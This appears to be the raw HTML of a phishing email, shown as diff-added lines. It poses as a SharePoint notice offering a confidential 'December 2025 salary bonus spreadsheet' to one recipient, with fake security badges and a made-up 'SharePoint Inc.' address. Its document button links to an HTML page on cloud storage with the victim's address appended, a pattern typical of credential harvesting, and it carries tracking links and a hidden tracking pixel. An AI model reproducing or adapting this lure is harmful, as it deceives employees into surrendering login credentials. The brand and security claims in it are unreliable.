+<COLGROUP style=3D"BOX-SIZING: border-box">
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D16>
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D608>
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D16></COLGROUP>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-TOP: 36px; PADDING-LEFT: 36px;=
+ PADDING-RIGHT: 36px" colSpan=3D3 align=3Dcenter></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; HEIGHT: 18px; VERTICAL-ALIGN: top; PAD=
+DING-BOTTOM: 16px; PADDING-TOP: 16px; PADDING-LEFT: 16px; PADDING-RIGHT: 16=
+px" vAlign=3Dtop colSpan=3D2><IMG style=3D"BORDER-TOP-STYLE: none; BOX-SIZI=
+NG: border-box; BORDER-LEFT-STYLE: none; VERTICAL-ALIGN: middle; BORDER-BOT=
+TOM-STYLE: none; BORDER-RIGHT-STYLE: none; DISPLAY: block" src=3D"http://cd=
+n.mcauto-images-production.sendgrid.net/9e1569890bc4f99b/b0ee7cb7-427b-48ed=
+-9939-947b10b64020/2058x654.png" width=3D250 height=3D80></TD>
+</TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(222,222,222) 1px solid=
+; PADDING-BOTTOM: 28px; TEXT-ALIGN: center; PADDING-TOP: 40px; PADDING-LEFT=
+: 20px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(248,248,248)" colSpan=3D=
+3>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: arial, he=
+lvetica, sans-serif; COLOR: rgb(50,49,48); PADDING-BOTTOM: 0px; PADDING-TOP=
+: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+<TABLE style=3D"BORDER-TOP: #e5e5e5 1px solid; BORDER-RIGHT: #e5e5e5 1px so=
+lid; BORDER-BOTTOM: #e5e5e5 1px solid; PADDING-BOTTOM: 15px; PADDING-TOP: 1=
+5px; PADDING-LEFT: 15px; BORDER-LEFT: #e5e5e5 1px solid; MARGIN: 15px 0px; =
+PADDING-RIGHT: 15px; BACKGROUND-COLOR: #f8f9fa" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDIN=
+G-LEFT: 0px; PADDING-RIGHT: 0px">
+<P align=3Dcenter><STRONG>Document:</STRONG>&nbsp;<FONT size=3D1><FONT colo=
+r=3D#000000><STRONG>December</STRONG> <STRONG>salary bonus&nbsp;spreadsheet=
+.docx</STRONG></FONT></FONT></P></TD></TR>
+<TR>
+<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDIN=
+G-LEFT: 0px; PADDING-RIGHT: 0px">
+<P align=3Dcenter><STRONG>Employee:</STRONG> jose@monkey.org</P></TD></TR>
+<TR>
+<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDIN=
+G-LEFT: 0px; PADDING-RIGHT: 0px">
+<P align=3Dcenter><STRONG>Date:</STRONG>
+ 11<SPAN style=3D'FONT-SIZE: 13px; FONT-FAMILY: "Segoe UI", "Segoe WP", "Se=
+goe UI WPC", Tahoma, Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: =
+0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(33,33,=
+33); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY=
+: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(248,249,=
+250); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial'>:21am, December 22, 2025.</SPAN></P></TD></TR>
+<TR>
+<TD style=3D"FONT-SIZE: 13px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDIN=
+G-LEFT: 0px; PADDING-RIGHT: 0px">
+<P align=3Dcenter><STRONG>Security:</STRONG> <SPAN style=3D"COLOR: #28a745"=
+>&#10003; Encrypted &amp; Secure</SPAN></P></TD></TR></TBODY></TABLE>Attach=
+ed&nbsp;<STRONG>December 2025 salary bonus spreadsheet</STRONG> is availabl=
+e for review. <BR><BR>Preview&nbsp;&amp; Save for your common reference.</P=
+></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BACKGROUND-COLOR: rgb(248,248,248)" co=
+lSpan=3D3 align=3Dcenter><A clicktracking=3D"off" style=3D"BOX-SIZING: bord=
+er-box; TEXT-DECORATION: none; HEIGHT: 144px; WIDTH: 623px; COLOR: rgb(50,4=
+9,48); DISPLAY: inline-block; BACKGROUND-COLOR: transparent" href=3D"https:=
+//storage.googleapis.com/54fc8e2b5059b03340cd04f0x816754fc8e6754fc8e2b5059b=
+0/book-bloke-broken-bald-black-beettle-bethel.html#jose@monkey.org">
+<TABLE style=3D"BOX-SIZING: border-box; HEIGHT: 124px; WIDTH: 578px; BACKGR=
+OUND: rgb(255,255,255); BORDER-COLLAPSE: collapse; TEXT-ALIGN: center" cell=
+Spacing=3D0 cellPadding=3D0 align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(210,210,210) 1px solid=
+; BACKGROUND: rgb(255,255,255); BORDER-BOTTOM: rgb(210,210,210) 1px solid; =
+PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 20px; BORDER-LEFT: r=
+gb(210,210,210) 1px solid; PADDING-RIGHT: 4px">
+<IMG style=3D"BORDER-TOP-STYLE: none; BOX-SIZING: border-box; BORDER-LEFT-S=
+TYLE: none; HEIGHT: 54px; WIDTH: 79px; VERTICAL-ALIGN: middle; BORDER-BOTTO=
+M-STYLE: none; BORDER-RIGHT-STYLE: none; DISPLAY: block" src=3D"http://cdn.=
+mcauto-images-production.sendgrid.net/803a3b8933626ea6/7d2e0863-840b-4b0e-a=
+d8d-01d42b261f6e/96x96.png" width=3D32 height=3D32></TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 10px; BORDER-TOP: rgb(210,2=
+10,210) 1px solid; BORDER-RIGHT: rgb(210,210,210) 1px solid; BORDER-BOTTOM:=
+ rgb(210,210,210) 1px solid; PADDING-BOTTOM: 20px; TEXT-ALIGN: left; PADDIN=
+G-TOP: 20px; PADDING-LEFT: 4px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(=
+255,255,255)"><FONT color=3D#1e27e1><FONT size=3D3><STRONG>December 2025</S=
+TRONG> <STRONG>salary bonus&nbsp;spreadsheet.docx</STRONG></FONT></FONT></T=
+D></TR></TBODY></TABLE></A><BR><BR></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center; BACKGROUND-COLOR: =
+rgb(248,248,248)" colSpan=3D3 align=3Dcenter>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: arial, =
+helvetica, sans-serif; DISPLAY: inline-block">
+<TABLE style=3D"BORDER-TOP: #ffeaa7 1px solid; BORDER-RIGHT: #ffeaa7 1px so=
+lid; BACKGROUND: #fff3cd; BORDER-BOTTOM: #ffeaa7 1px solid; PADDING-BOTTOM:=
+ 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; BORDER-LEFT: #ffeaa7 1px soli=
+d; PADDING-RIGHT: 10px" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bord=
+er=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 11px; COLOR: #856404; TEXT-ALIGN: center"><STRONG>C=
+ONFIDENTIAL:</STRONG> Contains sensitive salary information.Please do not s=
+hare.</TD></TR></TBODY></TABLE>
+<TABLE style=3D"MARGIN-TOP: 15px" cellSpacing=3D0 cellPadding=3D0 width=3D"=
+100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 10px; COLOR: #666666; TEXT-ALIGN: center; LINE-HEIG=
+HT: 1.3"><BR><BR>&copy; 2025 SharePoint Inc.<BR>221 Main Street, Suite 1550=
+<BR>San Francisco, CA 94105 </TD></TR></TBODY></TABLE></DIV></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: medium none; HEIGHT: 40px;=
+ BORDER-BOTTOM: medium none; PADDING-BOTTOM: 32px; TEXT-ALIGN: center; PADD=
+ING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(=
+248,248,248)" colSpan=3D3></TD></TR></TBODY></TABLE>
+<TABLE style=3D'BOX-SIZING: border-box; FONT-SIZE: 15px; OVERFLOW: hidden; =
+MAX-WIDTH: 640px; FONT-FAMILY: "Segoe UI", "Segoe WP", "Segoe UI WPC", Taho=
+ma, Arial, sans-serif; WIDTH: 640px; WHITE-SPACE: normal; WORD-SPACING: 0px=
+; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR:=
+ rgb(33,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px auto=
+; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: =
+0px; font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial' cellSpacing=3D0 cellPadding=
+=3D0 border=3D0>
+<COLGROUP style=3D"BOX-SIZING: border-box">
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D64>
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D256>
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D135>
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D175></COLGROUP>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; HEIGHT: 18px; VERTICAL-ALIGN: top; PAD=
+DING-BOTTOM: 16px; PADDING-TOP: 16px; PADDING-LEFT: 16px; PADDING-RIGHT: 16=
+px" vAlign=3Dtop colSpan=3D2></TD></TR></TBODY></TABLE></DIV></DIV></DIV></=
+DIV></DIV>
+<P style=3D"FONT-SIZE: 12px; LINE-HEIGHT: 20px"><A class=3DUnsubscribe--uns=
+ubscribeLink style=3D"TEXT-DECORATION: none; FONT-FAMILY: sans-serif" href=
+=3D"https://u51326402.ct.sendgrid.net/asm/unsubscribe/?user_id=3D51326402&a=
+mp;data=3DbBbe_V89bPNH3bx2-x1YX7MPUlwV-CBWb8dAWtl_yDBoMDAwdTAwMIBtXuGc2xPAx=
+dhUQhfk0MlTh_HYFj1ihZ0JpKmjM0w9KhWdky70ANqWO-sYjmCOXuprG0NKRGvypk-n5YEm-Bh3=
+jJ_cuX2AanpHGn5D2Sn8_CFScke1xHBW_pZm9cH47GMstYEE_mCDlAHm5YGsGbvWLG_Mz5ur9Lu=
+Zx5fbcQk6DahzqCzwLaaL_OzjhZaLTWhvYASUF6THpDTmrSuWtrx2DzDjef1hp7ENRjxnH8ysm1=
+akrK0p31H8ayg_X76wAyQjoIyy9lIhmMaVLv2ZiPA-h6lsB14LlVuCH_5vgt5dz3FgQ64fRCjTQ=
+2_5uLHAmgABYJtuSnMlkx3Ya1pR0PkQoumaHKoCxQyD8HkpB5DB3pzC1NF9S8Xf_oILUhj32mOQ=
+SANCREiJb6BtYCZO0flI1u9fRgZ1T6ico2ldCt8j8vqz7e7K5zPC_pGwoAQixLeQXNYbrvAFSjE=
+uETzSHzCyNHEwkoAnuyc1BTUjna6BVrS0K71z9iJshe4r2xPZGO9QLxSNeFM8uuV4Z8RWBDuOnd=
+uksg21H0zxytarPpsmATYsdkg2SYJ4ATJrYHpgaTq9LVJemd_CxbAWB9T9hstiXR_akgKKGbUui=
+uILNWrBEZQszDO8iZD-Rdp52wMKJ2pMhA30s5RxVV45JSTiQY0eGWuG5G-mzGR_Wfq581mM6hu6=
+vQeRWAnfibR4lzO9aCfsr6L5UaFuJbeUCFRVviBdR_P8mYi5sNZ-wRbuaDWelLy4pnrwCLEWE11=
+-UO2zvxKlpI-2q3EGP0KY37RLchyOl5oK6s25TFqXP0zN3GED3ZvQ7rfPo5mTdwDVjZwkC2ww_r=
+k0mmzpVIoxUOW8iVHa2jLrqr7oFvZtRRyDUyWk8sriAV4WF4odnXHJPiX2S8DnkcJIQo3OoGzo3=
+FLkacXa8EV2_-Yzx-SoAINhdAnDgn5YnuCsAYC6GCTGywCrWfrKzT1lWCTiXHeHx0B_TxVi1iI6=
+fUPwbnY3ozuA4FCDQN3S1EA7KdZKp_Ch9yks9Hce5hDlR-8dz2VBsT0NdDP44jLL9yPlO_BP586=
+ECBAn_FbforRA2eUwmZ-kIEYBUdSPwwTiMnyOwL4-g8I38pMFdXDF7twS7WBD7GrFTxNI" targ=
+et=3D_blank>Unsubscribe </A>- <A class=3DUnsubscribe--unsubscribePreference=
+s style=3D"TEXT-DECORATION: none; FONT-FAMILY: sans-serif" href=3D"https://=
+u51326402.ct.sendgrid.net/asm/?user_id=3D51326402&amp;data=3DRUF1WL8aXuOAkZ=
+tMBUr6InV7FJILkBINYJDbJJqZVPtoMDAwdTAwMPhF0b0be0HEOWCO7Bo_-MqUrx_nzrE_eAsTw=
+xiOl76IPPq7lVDT07_vATVgMveCewMU5katWKWLZPoAfaRlfK0Q1sHDnRp-Gvph3hXy1SSZKjov=
+laFH8TzElGOkD-T53Am99vb-W00QcISENfmR11PkmbmuWhTY1EX2CpfxSSzvLjOqBwRnBEAZ6t0=
+obWhbwtNiOPyzdnPdHKjUBsFGeEdUQ9VVqzEZzl6qUOVabku_zqlunRZCz8mW_BxCOjkYfx3BNm=
+958KXR1SCtXrv0PgJBJgl3z5pDHxqXo6lotTcr_mZOChMQSgz8tlWZh3qW0CFa-bMomOG5X24bU=
+9vVsbOJ2AROmLC2ZLL4W7Fd8-rR48RIaW2Qm9ZRmRI8DL8b7Z4DOsOUi68SQaCioH1odbCjTV1e=
+B5iObjY0HY_GaBaAlIWyb1OlG8fW9SUPBnmNY0_UxgcNXeq3brlLcM-Y2jAm-8QgbT6e7zhs2UV=
+Lw7RmrFqsrwNjVE5O6OQzl9mu6iHSPlBANHS_RzqnY0WJxuFvJTLV6M3N1-M1cvnJ9mLE8_daxs=
+u_nV7jbRKV8H84UCeu-hUIkLIFoiBQImkCG45-C5c-2FVoEUv6wACp9NlXAYKlvS1K_BbdqebcO=
+Zvtj-IGuci1wRQMNtfIodOTiC6wCj0lLuYU_KOWPfG0Jb6VVm1xDTOgV_bqonTfxvMNEtkNS4Ca=
+R7E-z5KY1D_XNmAiuYwnZSgu9asuKn6wDMbIlOeyGIgqQNVd4K4mQf8yXrbASprbpIu4yo2pBu3=
+FGKYsc6fverBv4j8t9bBsdXMuRuqyxbGYjjV97kpIAEzm3NRBLNvKDgNOGnJpCeBR3pLHi9RMe3=
+WOt3ZzVQhYMQOQ-7_0W_lxEAR2S_IYr7aoVxhBxC_XCVkTbU_FmPOu8gyyXCYBncS7PcK25NNP9=
+hIvjsxDIJwxmqHLO_StOlaP_HwU2xSHrPBvwrnp236-ERTLg4v-8czDn-jgT3JCKqajSJdJ3h34=
+s5xu8LzgvE195G2Fp4l369GXn40ZhrxRrQHZrTma-MBWJAQoe8ml9f6WYHDnE3JChh1uAObz_Rx=
+f__Y5uyS_xaI8qh7Yz2CU70Xe0hEz1S6dxe4TDg5f2vuX" target=3D_blank>Unsubscribe =
+Preferences </A></P>
+<DIV></DIV><img src=3D"https://u51326402.ct.sendgrid.net/wf/open?upn=3Du001=
+.z0wa68HzF9Nq0jK6BfRwezFGFpLUsJWsYBdYBoB39cpRh4Bj3ZA5XaL2-2F8z-2BnfBH2X8UZj=
+14-2FDQjowNopXf8M17Qx-2FeA8wV1Z-2BEqEozBnjcqvGcNvOxIrpFpIn1YLqwx-2BAfaJM62u=
+WnPCpEeXNAZrbtR4vlf4rM2bmikoBh9kyWvltuFpLwxiGdBRQppklAuWZtgOf0-2By6NRNllFNI=
+n6tfDo-2Bbhr3A0auRvR1vRetW5bHJAoZ8RH4mHkYAUq5pK8xK9l6FzfU1aMzAU5-2BBNxdBulG=
+-2F0nnwMOhONK-2B9G8bQu8letROxLvEnRMrFpz7ufpvCqhZzOMsd2ty-2FrhqCf12PvTT1llVi=
+pdeqUlru4FUR-2FL3M4-2BTQH3cJ1vPFuIEtwFZv4wI1-2BjU28CuM6-2B-2B-2BxkzCplGdawc=
+l-2F8NIx9UjfjTPlpRESqivXvgcn9oaCmMOS5VRvP4BvvhWi0M6IrCE4aInuEsFqMwPnsyF2zoB=
+pxhuRC3BZPi5b35bmxi9O6XPPDZieoGPJucznlOVby7P43fetJtD1O1cZyxBnqytxrg25vQpzuV=
+wDhLcIq0Rh7trl3Q05-2BwkBgOTwx-2BvX7YbnVVYKRwIo17Ds6BrRt24bnx6IN9VVUhvYwxTQ0=
+-2BXW-2BGphMVjCQIbEw36JIomhe-2FfXmFF-2BkDpMNkPEpf2MixfTdWxM-2FPvF8kFN3p-2BO=
+qZthlV65pB62UdHncnn2CNmmDskbKupzx3tIE-2BUezNHcnqidSbRdkaI72Y8Bd-2B6OQuQUlTI=
+s7zK281fXtlnKxVfvMXVDxLxvsUerWHVVEP4UnE6jdABd2YZUd54lmWxuXUgJKBJ1TUe1LXIE1o=
+DKerLvXYAGM3d-2Bc5xf3c4KLcu3mgrFDKnTkspOYruw1x5zn3kN86f2q9wZvIvrUmhEJ9pWnDh=
+JHHwTGy34IUOCs8-2FiPcJphvTgyldv2uvSdfXLk-2FA4VV5aYJL1k0dzVL6ZIR-2BGaGop-2F8=
+K1eMkgNCZlhXIfYZEQoqCw-3D" alt=3D"" width=3D"1" height=3D"1" border=3D"0" s=
+tyle=3D"height:1px !important;width:1px !important;border-width:0 !importan=
+t;margin-top:0 !important;margin-bottom:0 !important;margin-right:0 !import=
+ant;margin-left:0 !important;padding-top:0 !important;padding-bottom:0 !imp=
+ortant;padding-right:0 !important;padding-left:0 !important;"/></BODY></HTM=
+L>
+--296534cb5c338c48272f12eade72b5133d13d33e0272c97e485cf4e806df--
+
